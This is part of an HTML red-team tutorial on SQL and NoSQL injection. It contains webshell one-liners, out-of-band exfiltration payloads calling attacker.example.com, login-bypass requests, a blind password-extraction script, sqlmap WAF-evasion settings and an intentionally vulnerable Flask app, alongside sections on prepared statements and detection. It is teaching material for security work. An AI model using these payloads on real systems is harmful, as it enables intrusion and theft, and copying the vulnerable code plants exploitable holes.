+						<h4 id="webshell-alternatives">Webshell Alternatives</h4>
+						<pre class="bash">
+# PHP webshell (short)
+&lt;?=`$_GET[c]`?&gt;
+
+# PHP webshell (POST-based, doesn&#39;t appear in logs as much)
+&lt;?php system($_POST[&#39;c&#39;]); ?&gt;
+
+# ASP webshell
+&lt;% eval request(&#34;cmd&#34;) %&gt;
+
+# JSP webshell
+&lt;% Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)); %&gt;
+
+# Python/Flask — if file write goes to a Python app directory
+__import__(&#39;os&#39;).system(__import__(&#39;urllib&#39;).parse.unquote(__import__(&#39;urllib&#39;).parse.parse_qs(__import__(&#39;sys&#39;).stdin.read())[&#39;cmd&#39;][0]))
+						</pre>
+					</section>
+					<section>
+						<h3 id="out-of-band-sqli">Out-of-Band SQLi</h3>
+						<p>
+							When the injection is blind and the server firewall blocks inbound connections but allows outbound
+							<abbr title="Domain Name System">DNS</abbr>
+							, exfiltrate data through
+							<abbr title="Domain Name System">DNS</abbr>
+							queries. The attacker
+							receives
+							<abbr title="Domain Name System">DNS</abbr>
+							requests with data encoded in the subdomain.
+						</p>
+						<pre class="bash">
+# Prerequisites: set up a DNS listener on your attack box
+# interactsh-client (or Burp Collaborator, or a VPS with tcpdump on port 53)
+
+# MySQL: DNS exfiltration via LOAD_FILE + UNC path
+curl -s &#34;https://target.example.com/product?id=1&#39;; SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(SELECT DATABASE()),&#39;.attacker.example.com\\\\test&#39;))--&#34;
+
+# MSSQL: DNS exfiltration via xp_dirtree
+curl -s &#34;https://target.example.com/product?id=1&#39;; EXEC master..xp_dirtree &#39;\\\\&#39;+(SELECT DB_NAME())+&#39;.attacker.example.com\\test&#39;--&#34;
+
+# MSSQL: DNS exfiltration via xp_subdirs
+curl -s &#34;https://target.example.com/product?id=1&#39;; EXEC master..xp_subdirs &#39;\\\\&#39;+(SELECT SYSTEM_USER)+&#39;.attacker.example.com\\test&#39;--&#34;
+
+# Oracle: DNS exfiltration via UTL_HTTP
+curl -s &#34;https://target.example.com/product?id=1&#39; UNION SELECT UTL_HTTP.REQUEST(&#39;http://&#39;||(SELECT username FROM all_users WHERE ROWNUM=1)||&#39;.attacker.example.com/&#39;) FROM dual--&#34;
+						</pre>
+						<h4 id="oob-via-http-requests-from-the-database">OOB via HTTP requests from the database</h4>
+						<pre class="bash">
+# PostgreSQL: COPY to program (if superuser)
+curl -s &#34;https://target.example.com/product?id=1&#39;; COPY (SELECT current_database()) TO PROGRAM &#39;curl http://attacker.example.com/?data=&#39;||current_database()--&#34;
+
+# MySQL: User-Defined Function (UDF) — requires plugin directory write
+# First upload a shared library via INTO DUMPFILE, then create a function
+
+# MSSQL: xp_cmdshell — if enabled
+curl -s &#34;https://target.example.com/product?id=1&#39;; EXEC xp_cmdshell &#39;curl http://attacker.example.com/?d=&#39;+(SELECT DB_NAME())--&#34;
+						</pre>
+					</section>
+					<section>
+						<h3 id="second-order-sql-injection">Second-Order SQL Injection</h3>
+						<p>
+							Data stored through one request is used unsafely in a later query. The injection point is not
+							where the data enters, but where it is later retrieved.
+						</p>
+						<pre class="python">
+# VULNERABLE: second-order SQLi example
+# Endpoint 1: User registration — stores username safely (or so it seems)
+@app.route(&#39;/register&#39;, methods=[&#39;POST&#39;])
+def register():
+    username = request.form[&#39;username&#39;]  # user supplies: admin&#39; OR &#39;1&#39;=&#39;1
+    db.execute(&#34;INSERT INTO users (username) VALUES (?)&#34;, [username])
+    # Stored as: admin&#39; OR &#39;1&#39;=&#39;1
+
+# Endpoint 2: Profile lookup — uses stored username unsafely
+@app.route(&#39;/profile&#39;)
+def profile():
+    username = db.execute(&#34;SELECT username FROM users WHERE id=?&#34;, [session[&#39;user_id&#39;]]).fetchone()[0]
+    # username = &#34;admin&#39; OR &#39;1&#39;=&#39;1&#34;
+    query = f&#34;SELECT * FROM users WHERE username=&#39;{username}&#39;&#34;  # UNSAFE concatenation
+    result = db.execute(query).fetchall()
+    # Query becomes: SELECT * FROM users WHERE username=&#39;admin&#39; OR &#39;1&#39;=&#39;1&#39;
+    # Returns ALL users
+						</pre>
+						<pre class="bash">
+# Exploitation workflow:
+# 1. Register with payload username: test&#39; UNION SELECT 1,password,3 FROM users WHERE &#39;1&#39;=&#39;1
+# 2. Log in
+# 3. Visit profile page — it injects the stored username into a query
+# 4. Result: profile page now contains all users&#39; passwords
+						</pre>
+					</section>
+					<section>
+						<h3 id="nosql-injection-mongodb">NoSQL Injection (MongoDB)</h3>
+						<p>
+							<abbr title="Not Only SQL">NoSQL</abbr>
+							databases parse query operators from user input when input is passed directly
+							to query objects. Unlike
+							<abbr title="Structured Query Language">SQL</abbr>
+							, the injection manipulates the query
+							<em>structure</em>
+							rather than the query
+							<em>string</em>
+							.
+						</p>
+						<pre class="python">
+# VULNERABLE: Flask + PyMongo
+@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
+def login():
+    username = request.form[&#39;username&#39;]
+    password = request.form[&#39;password&#39;]
+    user = db.users.find_one({&#39;username&#39;: username, &#39;password&#39;: password})
+    # If username and password are parsed as dicts/objects, operators pass through
+    if user:
+        session[&#39;user&#39;] = str(user[&#39;_id&#39;])
+        return redirect(&#39;/dashboard&#39;)
+    return &#39;Login failed&#39;
+						</pre>
+						<pre class="bash">
+# Normal request body (URL-encoded or JSON)
+# username=admin&amp;password=admin123
+
+# Bypass login: $ne (not equal) — matches any document where field is not the value
+# If JSON body is accepted:
+curl -s -X POST &#39;https://target.example.com/login&#39; \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;username&#34;: {&#34;$ne&#34;: &#34;&#34;}, &#34;password&#34;: {&#34;$ne&#34;: &#34;&#34;}}&#39;
+# Query becomes: db.users.findOne({username: {$ne: &#34;&#34;}, password: {$ne: &#34;&#34;}})
+# This matches any user with a non-empty username and password → bypass
+
+# Bypass with $regex — match any string
+curl -s -X POST &#39;https://target.example.com/login&#39; \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;username&#34;: {&#34;$regex&#34;: &#34;.*&#34;}, &#34;password&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}&#39;
+
+# Extract username via $regex character-by-character (blind NoSQLi)
+curl -s -X POST &#39;https://target.example.com/login&#39; \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;username&#34;: {&#34;$regex&#34;: &#34;^a&#34;}, &#34;password&#34;: {&#34;$ne&#34;: &#34;&#34;}}&#39;
+# If login succeeds → an admin username starts with &#39;a&#39;
+
+# $where operator - JavaScript execution (if enabled)
+curl -s -X POST &#39;https://target.example.com/login&#39; \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;username&#34;: &#34;admin&#34;, &#34;$where&#34;: &#34;function() { var d = new Date(); while (new Date() - d &lt; 5000); return true; }&#34;}&#39;
+# Time-based detection via a JavaScript busy-wait (no sleep primitive exists)
+
+# Extract data via $where injection
+curl -s -X POST &#39;https://target.example.com/search&#39; \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;search&#34;: &#34;&#34;, &#34;$where&#34;: &#34;this.password.length &gt; 5&#34;}&#39;
+# Returns users whose password length &gt; 5
+						</pre>
+						<h4 id="automated-nosql-injection-extraction">Automated NoSQL injection extraction</h4>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;Blind NoSQL injection (MongoDB $regex) username/password extraction.&#34;&#34;&#34;
+import requests
+import string
+
+TARGET = &#34;https://target.example.com/login&#34;
+CHARSET = string.ascii_lowercase + string.digits + &#34;!@#$%^&amp;*&#34;
+
+def check_prefix(username_prefix: str, password_prefix: str) -&gt; bool:
+    &#34;&#34;&#34;Check if a credential with given prefix exists.&#34;&#34;&#34;
+    payload = {
+        &#34;username&#34;: {&#34;$regex&#34;: f&#34;^{username_prefix}&#34;},
+        &#34;password&#34;: {&#34;$regex&#34;: f&#34;^{password_prefix}&#34;}
+    }
+    resp = requests.post(TARGET, json=payload, allow_redirects=False)
+    return resp.status_code == 302  # Successful login redirects
+
+def extract_field(known_prefix: str, known_other: str, other_field: str) -&gt; str:
+    &#34;&#34;&#34;Extract one field character by character given the other is known.&#34;&#34;&#34;
+    prefix = known_prefix
+    while True:
+        for char in CHARSET + &#34;}&#34;:  # } = terminator
+            if char == &#34;}&#34;:
+                return prefix
+            payload = {
+                other_field: known_other,
+                &#34;target&#34;: {&#34;$regex&#34;: f&#34;^{prefix}{char}&#34;}
+            }
+            # Adapt this to the actual endpoint structure
+            if check_prefix(f&#34;^{prefix}{char}&#34;, known_other):
+                prefix += char
+                print(f&#34;\r[*] {prefix}&#34;, end=&#34;&#34;, flush=True)
+                break
+    return prefix
+
+# Extract admin password (assuming username &#34;admin&#34; is known)
+password = extract_field(&#34;admin&#34;, &#34;&#34;, &#34;password&#34;)
+print(f&#34;\n[+] Password: {password}&#34;)
+						</pre>
+					</section>
+					<section>
+						<h3 id="sqlmap-automated-exploitation">SQLmap: Automated Exploitation</h3>
+						<p>
+							<abbr title="Structured Query Language">SQL</abbr>
+							map automates detection, enumeration, and exploitation but
+							understanding the manual methods is necessary to interpret its output and handle edge cases.
+						</p>
+						<pre class="bash">
+# Basic detection: test all parameters
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; --batch
+
+# Specify parameter, database type, and risk level
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; \
+  -p id --dbms=mysql --level=3 --risk=2
+
+# POST request with data
+sqlmap -u &#39;https://target.example.com/login&#39; \
+  --data=&#39;username=admin&amp;password=test&#39; --batch
+
+# Request from file (Burp saved request)
+sqlmap -r request.txt --batch
+
+# Enumeration
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; --dbs          # List databases
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; -D appdb --tables      # List tables
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; -D appdb -T users --columns  # List columns
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; -D appdb -T users --dump     # Dump data
+
+# Dump specific columns
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; \
+  -D appdb -T users -C username,password --dump
+
+# OS shell via MySQL (requires FILE privilege, writeable web root)
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; --os-shell
+
+# Tamper scripts — bypass WAFs and filters
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; \
+  --tamper=space2comment,between,randomcase --batch
+
+# Common tamper combinations for different WAFs:
+# Cloudflare:    space2comment,charencode,randomcase
+# ModSecurity:   space2hash,space2mysqlblank,percentage
+# Imperva:       space2comment,charunicodeencode,versionedmorekeywords
+sqlmap -u &#39;https://target.example.com/product?id=1&#39; \
+  --tamper=&#39;space2comment,randomcase,between&#39; \
+  --level=5 --risk=3 --batch
+						</pre>
+						<h4 id="key-tamper-scripts-and-what-they-do">Key tamper scripts and what they do</h4>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Tamper Script</th>
+									<th align="center">Technique</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>space2comment</code></td>
+									<td align="center">Spaces -><code>/**/</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>between</code></td>
+									<td align="center"><code>=</code>-><code>BETWEEN</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>randomcase</code></td>
+									<td align="center">Random case:<code>SELECT</code>-><code>sElEcT</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>charencode</code></td>
+									<td align="center">URL-encodes all characters</td>
+								</tr>
+								<tr>
+									<td align="center"><code>charunicodeencode</code></td>
+									<td align="center">Unicode-encodes characters</td>
+								</tr>
+								<tr>
+									<td align="center"><code>equaltolike</code></td>
+									<td align="center"><code>=</code>-><code>LIKE</code></td>
+								</tr>
+								<tr>
+									<td align="center"><code>percentage</code></td>
+									<td align="center">Adds<code>%</code>before each character</td>
+								</tr>
+								<tr>
+									<td align="center"><code>apostrophemask</code></td>
+									<td align="center"><code>&#39;</code>-><code>%EF%BC%87</code>(full-width quote)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>space2hash</code></td>
+									<td align="center">Spaces -><code>%23%0A</code>(# + newline, MySQL comment)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>versionedmorekeywords</code></td>
+									<td align="center">Adds MySQL versioned comments:<code>/*!UNION*/</code></td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="prepared-statements-how-the-fix-works">Prepared Statements: How the Fix Works</h3>
+						<p>The fundamental difference between vulnerable and secure code:</p>
+						<pre class="python">
+# VULNERABLE: string interpolation
+cursor.execute(f&#34;SELECT * FROM users WHERE username=&#39;{username}&#39;&#34;)
+# The database parses: SELECT ... WHERE username=&#39;admin&#39; OR &#39;1&#39;=&#39;1&#39;
+# The string &#39;admin&#39; OR &#39;1&#39;=&#39;1&#39; is parsed as SQL CODE, not DATA
+
+# SECURE: parameterized query / prepared statement
+cursor.execute(&#34;SELECT * FROM users WHERE username=?&#34;, (username,))
+# The database compiles: SELECT ... WHERE username=?  (query plan is fixed)
+# Then binds: parameter[0] = &#34;admin&#39; OR &#39;1&#39;=&#39;1&#34;  (treated as literal DATA)
+# The query searches for a username that LITERALLY contains the quote characters
+# No injection possible — the query structure cannot be altered by data
+						</pre>
+						<p>
+							The query is sent to the database in two phases: 1.
+							<b>Prepare</b>
+							: The database compiles the
+							query structure (SELECT columns FROM table WHERE condition). After this phase, the query structure
+							is immutable. 1.
+							<b>Execute</b>
+							: Data values are bound to the parameter placeholders. These values
+							are treated strictly as data - never as code.
+						</p>
+						<p>
+							This works for all relational databases and most
+							<abbr title="Not Only SQL">NoSQL</abbr>
+							databases. For MongoDB,
+							use the driver's type-safe query builders instead of passing raw user dictionaries to
+							<code>find()</code>
+							.
+						</p>
+						<pre class="python">
+# SECURE: MongoDB with type checking
+from bson import ObjectId
+
+@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
+def login():
+    username = str(request.form[&#39;username&#39;])  # Force string type
+    password = str(request.form[&#39;password&#39;])
+    # Cannot pass dict/object because it&#39;s coerced to string
+    user = db.users.find_one({&#39;username&#39;: username, &#39;password&#39;: password})
+						</pre>
+					</section>
+					<section>
+						<h3 id="manual-exploitation-walkthrough">Manual Exploitation Walkthrough</h3>
+						<p>
+							A step-by-step exploitation of a vulnerable Flask +
+							<abbr title="SQL Injection">SQLi</abbr>
+							te application.
+						</p>
+						<pre class="python">
+#!/usr/bin/env python3
+&#34;&#34;&#34;
+Vulnerable Flask app for SQLi practice — SQLite backend.
+Save as app.py, run with: FLASK_APP=app.py flask run --host=0.0.0.0
+&#34;&#34;&#34;
+from flask import Flask, request, render_template_string
+import sqlite3
+
+app = Flask(__name__)
+
+HTML = &#34;&#34;&#34;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;{% if user %}{{ user[1] }}{% endif %}&lt;/h2&gt;
+&lt;form method=&#34;GET&#34; action=&#34;/search&#34;&gt;
+  &lt;input name=&#34;query&#34; placeholder=&#34;Search users&#34;&gt;
+  &lt;input type=&#34;submit&#34;&gt;
+&lt;/form&gt;
+{% if results %}
+&lt;h3&gt;Results:&lt;/h3&gt;
+&lt;ul&gt;
+{% for row in results %}
+  &lt;li&gt;{{ row[0] }}: {{ row[1] }} ({{ row[2] }})&lt;/li&gt;
+{% endfor %}
+&lt;/ul&gt;
+{% endif %}
+{% if error %}&lt;p style=&#34;color:red&#34;&gt;{{ error }}&lt;/p&gt;{% endif %}
+&lt;/body&gt;&lt;/html&gt;
+&#34;&#34;&#34;
+
+LOGIN_HTML = &#34;&#34;&#34;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;Login&lt;/h2&gt;
+&lt;form method=&#34;GET&#34; action=&#34;/login&#34;&gt;
+  &lt;input name=&#34;username&#34; placeholder=&#34;Username&#34;&gt;
+  &lt;input name=&#34;password&#34; type=&#34;password&#34; placeholder=&#34;Password&#34;&gt;
+  &lt;input type=&#34;submit&#34;&gt;
+&lt;/form&gt;
+{% if msg %}&lt;p&gt;{{ msg }}&lt;/p&gt;{% endif %}
+&lt;/body&gt;&lt;/html&gt;
+&#34;&#34;&#34;
+
+def get_db():
+    conn = sqlite3.connect(&#39;app.db&#39;)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+def init_db():
+    conn = sqlite3.connect(&#39;app.db&#39;)
+    conn.execute(&#34;&#34;&#34;
+        CREATE TABLE IF NOT EXISTS users (
+            id INTEGER PRIMARY KEY,
+            username TEXT,
+            password TEXT,
+            email TEXT
+        )
+    &#34;&#34;&#34;)
+    conn.execute(&#34;INSERT OR IGNORE INTO users VALUES (1,&#39;admin&#39;,&#39;s3cr3t_p@ss&#39;,&#39;admin@example.com&#39;)&#34;)
+    conn.execute(&#34;INSERT OR IGNORE INTO users VALUES (2,&#39;alice&#39;,&#39;alice123&#39;,&#39;alice@example.com&#39;)&#34;)
+    conn.execute(&#34;INSERT OR IGNORE INTO users VALUES (3,&#39;bob&#39;,&#39;bob456&#39;,&#39;bob@example.com&#39;)&#34;)
+    conn.execute(&#34;&#34;&#34;
+        CREATE TABLE IF NOT EXISTS products (
+            id INTEGER PRIMARY KEY,
+            name TEXT,
+            price REAL
+        )
+    &#34;&#34;&#34;)
+    conn.execute(&#34;INSERT OR IGNORE INTO products VALUES (1,&#39;Widget&#39;, 9.99)&#34;)
+    conn.execute(&#34;INSERT OR IGNORE INTO products VALUES (2,&#39;Gadget&#39;, 19.99)&#34;)
+    conn.execute(&#34;INSERT OR IGNORE INTO products VALUES (3,&#39;Thingamajig&#39;, 29.99)&#34;)
+    conn.commit()
+    conn.close()
+
+@app.route(&#39;/&#39;)
+def index():
+    conn = get_db()
+    # VULNERABLE: direct string concatenation
+    query_param = request.args.get(&#39;query&#39;, &#39;&#39;)
+    if query_param:
+        query = f&#34;SELECT id, username, email FROM users WHERE username LIKE &#39;%{query_param}%&#39;&#34;
+        try:
+            results = conn.execute(query).fetchall()
+        except Exception as e:
+            return render_template_string(HTML, error=str(e), results=None, user=None)
+    else:
+        results = None
+    conn.close()
+    return render_template_string(HTML, results=results, user=None)
+
+@app.route(&#39;/login&#39;)
+def login():
+    conn = get_db()
+    username = request.args.get(&#39;username&#39;, &#39;&#39;)
+    password = request.args.get(&#39;password&#39;, &#39;&#39;)
+    msg = &#34;Invalid credentials&#34;
+    if username and password:
+        # VULNERABLE: direct string concatenation
+        query = f&#34;SELECT * FROM users WHERE username=&#39;{username}&#39; AND password=&#39;{password}&#39;&#34;
+        try:
+            user = conn.execute(query).fetchone()
+            if user:
+                msg = f&#34;Welcome, {user[&#39;username&#39;]}!&#34;
+        except Exception as e:
+            msg = f&#34;Error: {e}&#34;
+    conn.close()
+    return render_template_string(LOGIN_HTML, msg=msg)
+
+if __name__ == &#39;__main__&#39;:
+    init_db()
+    app.run(host=&#39;0.0.0.0&#39;, port=5000, debug=False)
+						</pre>
+						<p>Exploitation walkthrough:</p>
+						<pre class="bash">
+# 1. Normal usage — baseline
+curl -s &#39;http://localhost:5000/?query=admin&#39;
+# Returns: admin (admin@example.com)
+
+# 2. Test for injection
+curl -s &#34;http://localhost:5000/?query=admin&#39;&#34;
+# Error: &#34;unrecognized token: &#39;admin&#39;&#34;&#39;  → SQLite, injection confirmed
+
+# 3. Extract all users via UNION
+curl -s &#34;http://localhost:5000/?query=&#39; UNION SELECT 1,username,password FROM users--&#34;
+# Returns all usernames and passwords
+
+# 4. Extract table list from sqlite_master
+curl -s &#34;http://localhost:5000/?query=&#39; UNION SELECT 1,name,sql FROM sqlite_master WHERE type=&#39;table&#39;--&#34;
+# Returns all table names and their CREATE TABLE statements
+
+# 5. Login bypass
+curl -s &#34;http://localhost:5000/login?username=admin&amp;password=&#39; OR &#39;1&#39;=&#39;1&#34;
+# Returns: &#34;Welcome, admin!&#34; — first user in the table
+
+# 6. Login as a specific user (non-first)
+curl -s &#34;http://localhost:5000/login?username=bob&#39;--&amp;password=anything&#34;
+# Returns: &#34;Welcome, bob!&#34; — comment bypasses password check entirely
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go tool that detects boolean-based
+							<abbr title="SQL Injection">SQLi</abbr>
+							. It requests a parameter with
+							a true condition (
+							<code>1 AND 1=1</code>
+							) and a false condition (
+							<code>1 AND 1=2</code>
+							), compares the response
+							length of each against a baseline, and reports when the true branch matches the baseline but
+							the false branch does not. Point it at the vulnerable Flask app from the previous section, or
+							at any authorized target.
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;fmt&#34;
+	&#34;io&#34;
+	&#34;net/http&#34;
+	&#34;net/url&#34;
+	&#34;os&#34;
+)
+
+func bodyLength(client *http.Client, target, param, value string) (int, error) {
+	u, err := url.Parse(target)
+	if err != nil {
+		return 0, err
+	}
+	q := u.Query()
+	q.Set(param, value)
+	u.RawQuery = q.Encode()
+
+	resp, err := client.Get(u.String())
+	if err != nil {
+		return 0, err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return 0, err
+	}
+	return len(body), nil
+}
+
+func main() {
+	if len(os.Args) != 3 {
+		fmt.Fprintf(os.Stderr, &#34;usage: %s &lt;url&gt; &lt;param&gt;\n&#34;, os.Args[0])
+		os.Exit(1)
+	}
+	target, param := os.Args[1], os.Args[2]
+	client := &amp;http.Client{}
+
+	baseline, err := bodyLength(client, target, param, &#34;1&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	trueLen, err := bodyLength(client, target, param, &#34;1 AND 1=1&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+	falseLen, err := bodyLength(client, target, param, &#34;1 AND 1=2&#34;)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, err)
+		os.Exit(1)
+	}
+
+	fmt.Printf(&#34;baseline=%d true=%d false=%d\n&#34;, baseline, trueLen, falseLen)
+	if trueLen == baseline &amp;&amp; falseLen != baseline {
+		fmt.Println(&#34;[+] boolean-based SQL injection is likely&#34;)
+	} else {
+		fmt.Println(&#34;[-] no clear boolean signal&#34;)
+	}
+}
+						</pre>
+						<p>Run it against the practice app:</p>
+						<pre class="bash">
+go run sqli-detect.go &#39;http://localhost:5000/&#39; query
+						</pre>
+						<p>
+							A container with
+							<abbr title="SQL Injection">SQLi</abbr>
+							te, My
+							<abbr title="Structured Query Language">SQL</abbr>
+							, and MongoDB
+							targets is provided:
+						</p>
+						<p><a href="/wiki/articles/redteam/sql-injection.Containerfile">sql-injection.Containerfile</a></p>
+						<pre class="bash">
+podman build -t sql-injection -f sql-injection.Containerfile .
+podman run --rm -it -p 8080:8080 -p 8081:8081 -p 8082:8082 sql-injection
+# SQLite (Flask) on 8080, MySQL (PHP) on 8081, MongoDB (Flask) on 8082
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger - SQL Injection</a></li>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" target="_blank">OWASP - SQL Injection Prevention Cheat Sheet</a></li>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" target="_blank">OWASP - Query Parameterization Cheat Sheet</a></li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89: SQL Injection</a></li>
+							<li><a class="icon-website" href="https://sqlmap.org/" target="_blank">sqlmap - Automatic SQL Injection Tool</a></li>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html" target="_blank">OWASP - NoSQL Security Cheat Sheet</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
